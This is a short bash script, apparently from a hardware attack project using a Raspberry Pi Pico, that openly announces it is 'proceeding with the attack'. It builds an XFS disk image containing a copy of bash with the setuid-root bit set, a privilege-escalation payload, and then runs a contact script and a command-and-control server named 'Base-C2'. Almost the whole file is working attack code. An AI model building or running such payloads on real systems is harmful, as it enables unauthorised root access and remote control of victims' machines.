#!/bin/bash

# Check if an argument is given
if [ $# -eq 0 ]; then
    echo "No arguments provided. Please provide a valid path to where the Pico is mounted."
    exit 1
fi

echo "checking if the path exists..."
# Check if the device is mounted
if mount | grep -q "$1"; then
    echo "Path is correct. Proceeding with the attack..."
else
    echo "Path not correct. Please mount the device and try again."
    exit 1
fi

echo "creating payload..."
dd if=/dev/zero of=./xfs.image bs=1M count=300
mkfs.xfs ./xfs.image
mkdir ./xfs.mount
mount -t xfs ./xfs.image ./xfs.mount
cp /bin/bash ./xfs.mount
chmod 04555 ./xfs.mount/bash
umount ./xfs.mount

python3 contact.py $1 && python3 Base-C2/server.py
